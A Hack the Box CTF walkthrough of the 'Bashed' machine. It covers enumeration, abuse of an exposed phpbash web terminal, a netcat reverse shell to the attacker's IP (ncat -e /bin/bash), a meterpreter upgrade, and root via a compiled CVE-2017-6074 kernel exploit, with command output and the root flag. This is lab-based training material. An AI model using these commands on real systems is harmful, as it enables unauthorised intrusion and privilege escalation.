---
title: Bashed, Hack the Box CTF Walkthrough
lead: Exploiting the Linux Kernel 4.4.0 (Ubuntu) - With DCCP Double-Free Privilege Escalation
tag: CTF
image: /assets/img/posts/2021-03-05-bashed-hack-the-box-walkthrough/bashed.png
layout: post
style: blog2
description: ""
date:   2021-03-04 20:01:21 -0400
last-updated: 2021-03-04 20:01:21 -0400
tag: ctf
author: Tyler Butler
description: "Bashed is an easy level CTF challenge from HTB, solved with an initial user compromise through a developer misconfiguration and privilege escalation with the Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation Exploit"
card: card-2
---

# Overview
<a href="https://app.hackthebox.eu/machines/118" class="highlighted">Bashed</a> is a boot to root CTF from the Hack the Box archives. This was one of my favorite retired HTB challenges so far. The challenge involves initial compromise using a developer's misconfigured server and requires significant more work to escalate privileges to root. This challenge forced me to think outside the box for managing shells and was overall a good CTF.  



## Enumeration  

First, I conducted a basic nmap scan to enumerate open ports and services running on the target machine. The scan revealed an apache webserver was running on port 80.  

```bash
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ nmap -sV --top-ports 200 10.10.10.68           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 09:06 EST
Nmap scan report for 10.10.10.68
Host is up (0.035s latency).
Not shown: 199 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```  

## Web Application Testing   

Nexct, I launched BurpSuite and a firefox browser to being inspecting the target's web application. In the background, I started `dirb` a directory brute forcing tool. The resulting dirb scan revealed a directory called `dev`.  

```bash
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ dirb http://10.10.10.68         

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Mar  5 09:10:15 2021
URL_BASE: http://10.10.10.68/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.68/ ----
==> DIRECTORY: http://10.10.10.68/css/                                                                                                          
==> DIRECTORY: http://10.10.10.68/dev/                                                                                                          
==> DIRECTORY: http://10.10.10.68/fonts/                                                                                                        
==> DIRECTORY: http://10.10.10.68/images/                                                                                                       
+ http://10.10.10.68/index.html (CODE:200|SIZE:7743)                                                                                            
==> DIRECTORY: http://10.10.10.68/js/                                                                                                           
==> DIRECTORY: http://10.10.10.68/php/                                                                                                          
+ http://10.10.10.68/server-status (CODE:403|SIZE:299)                                                                                          
==> DIRECTORY: http://10.10.10.68/uploads/    
```  

## Exploit Developer Tools  

After reading the index page of the website, I understood the server was also being used to develop the tool [php bash](https://github.com/Arrexel/phpbash). Browsing the /dev path shows that indeed, a working version of phpbash is running on the target server. The program allows a user to interact with a bash like terminal through the browser itself. I used this terminal to find the user flag, which was located at `/home/arrexel`.  

<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-03-05-bashed-hack-the-box-walkthrough/user-flag.png">
    </div>
</div>
<br/>  


## Privilege Escalation  

To start the privilege escalation process, I wanted to upgrade my shell from the phpBash shell to a meterpreter one. Unfortunately, when trying to send a reverse shell to my attacker machine with `netcat`, an error message occured stating that the -e option was not available. This was because the installed version of netcat was the BSD flavor (netcat-openBSD), only the traditional netcat (netcat-traditional) supports the -e option which is required to send a reverse shell. To get around this, I found a <a class="highlighted" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat">linux binary version</a>of the traditional netcat. After downloading the binary, I put in the `/var/www/html` directory to serve with the apache webserver, then used `wget` to download the file to the target machine through the dev phpBash terminal. 

```bash
www-data@bashed:/var/www/html/uploads# wget 10.10.14.13/ncat-d
```  

Next, I started a listener on my attack machine with the multi/handler on metasploit to catch the reverse shell.  

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
```  
Once the handler was started, I used the the phpBash sell to issue a reverse shell through the uploaded ncat binary. 

```bash
www-data@bashed:./ncat-d 10.10.14.13 4444 -e /bin/bash
```  


```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Command shell session 1 opened (10.10.14.13:4444 -> 10.10.10.68:48554) at 2021-03-05 18:34:33 -0500
```  

### Upgrading to Meterpreter Shell

Once I recieved the reverse shell, I background it with the cntl-z option. To upgrade this basic shell to a meterpreter one, I used the `multi/manage/shell_to_meterpreter` module. After configuring the necessary options, I executed the module and started the meterpreter session.  

```bash
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 10.10.14.13
LHOST => 10.10.14.13
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.13:4433 
[*] Sending stage (980808 bytes) to 10.10.10.68
[*] Meterpreter session 2 opened (10.10.14.13:4433 -> 10.10.10.68:42086) at 2021-03-05 18:38:50 -0500
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
```  

## Privilege Escalation via CVE-2017-6074

The last stage to escalate privileges was to find a public exploit that would work against the linux kernel. Some online research revealed that the Ubuntu 16.04 (Linux 4.4.0-62-generic) kernel being used by the target could be vulnerable to. CVE-2017-6074. I downloaded a proof of concept from <a class="highlighted" href="https://www.exploit-db.com/exploits/41458">exploi-db</a>. Using `GCC`, I compiled the exploit, then uploaded it to the target using the `upload` meterpreter command back in the metepreter session.  


```bash
meterpreter > upload /home/kali/Documents/htb/bashed/CVE-2017-6074
[*] uploading  : /home/kali/Documents/htb/bashed/CVE-2017-6074 -> CVE-2017-6074
[*] Uploaded -1.00 B of 23.19 KiB (-0.0%): /home/kali/Documents/htb/bashed/CVE-2017-6074 -> CVE-2017-6074
[*] uploaded   : /home/kali/Documents/htb/bashed/CVE-2017-6074 -> CVE-2017-6074
meterpreter > chmod 777 CVE-2017-6074 
meterpreter > shell
Process 819 created.
Channel 2 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@bashed:~/html/uploads$ 


www-data@bashed:~/html/uploads$ whoami
whoami
www-data
www-data@bashed:~/html/uploads$ ./CVE-2017-6074
./CVE-2017-6074
[.] namespace sandbox setup successfully
[.] disabling SMEP & SMAP
[.] scheduling 0xffffffff81064550(0x406e0)
[.] waiting for the timer to execute
[.] done
[.] SMEP & SMAP should be off now
[.] getting root
[.] executing 0x564e7dc912aa
[.] done
[.] should be root now
[.] checking if we got root
[+] got r00t ^_^
[!] don't kill the exploit binary, the kernel will crash
root@bashed:/var/www/html/uploads# whoami
whoami
root
root@bashed:/var/www/html/uploads# cat /root/root.txt
cat /root/root.txt
cc4f0afe3a1026d402ba10329674a8e2
```


